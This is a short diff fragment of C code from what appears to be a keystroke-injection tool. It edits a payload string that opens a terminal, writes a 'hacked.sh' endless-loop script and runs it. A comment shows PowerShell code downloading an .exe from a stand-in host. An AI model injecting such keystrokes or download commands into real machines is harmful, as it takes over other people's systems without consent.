@@ -57,7 +57,7 @@
  * $client = New-Object System.Net.WebClient
  * $client.DownloadFile("http://www.example.com/file.exe", "C:\")
  */
-char *str = "K: ALT F2\nW: 500\nS: konsole\nW: 500\nS: echo '#!/bin/sh'>hacked.sh\nS: echo 'while :; do echo \"Hacked or so :))\";done'>>hacked.sh\nS: sh hacked.sh &\0";
+char *str = "K: ALT F2\nW: 500\nS: konsole\nR\nW: 500\nS: echo '#!/bin/sh'>hacked.sh\nR\nS: echo 'while :; do echo \"Hacked or so :))\";done'>>hacked.sh\n\nRS: sh hacked.sh &\nR\0";
 
 /**
  * 
